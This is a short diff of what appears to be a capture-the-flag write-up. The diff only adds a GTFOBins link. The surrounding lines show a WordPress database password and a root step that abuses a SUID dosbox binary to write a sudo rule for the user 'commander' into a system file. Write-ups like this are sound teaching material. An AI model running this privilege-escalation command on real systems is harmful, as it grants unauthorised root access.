@@ -19,7 +19,7 @@ define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
 ```
 
 ### Root
-SUID /usr/bin/dosbox
+SUID [/usr/bin/dosbox](https://gtfobins.github.io/gtfobins/dosbox/#suid)
 
 ```bash
 /usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >c:$LFILE" -c exit
